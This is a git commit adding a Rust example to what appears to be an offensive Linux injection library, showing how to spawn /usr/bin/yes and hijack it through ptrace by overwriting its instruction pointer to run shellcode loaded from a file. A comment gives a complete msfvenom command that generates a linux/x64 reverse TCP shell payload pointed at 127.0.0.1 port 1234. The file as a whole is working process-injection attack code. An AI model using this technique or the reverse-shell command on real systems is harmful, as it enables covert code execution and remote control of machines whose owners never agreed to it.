decbc3e43b1f1cf8fba70442c0c6696e347061c0
dustyw0lf <dustyw0lf@users.noreply.github.com>
2024-11-22 20:41:00 +0200

    docs(examples): add example - spawn procfs overwrite rip

---
+++ examples/spawn_procfs_overwrite_rip_shellcode.rs
@@ -0,0 +1,29 @@
+use std::env::current_dir;
+
+use linc::payload::{Payload, PayloadResultExt, Spawn};
+use linc::techniques::spawn::ptrace_overwrite_rip;
+
+fn main() {
+    let path = current_dir().unwrap();
+    let cwd = path.display();
+
+    // Shellcode:
+    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
+    let shellcode = format!("{}/assets/shellcode.bin", cwd);
+
+    let payload = Payload::<Spawn>::from_file(&shellcode)
+        .set_target("/usr/bin/yes")
+        .set_target_args("YES");
+
+    let payload = match payload {
+        Ok(p) => p,
+        Err(e) => {
+            eprintln!("Failed to create payload: {:?}", e);
+            return;
+        }
+    };
+
+    if let Err(e) = ptrace_overwrite_rip(payload) {
+        eprintln!("An error occurred: {:?}", e);
+    }
+}
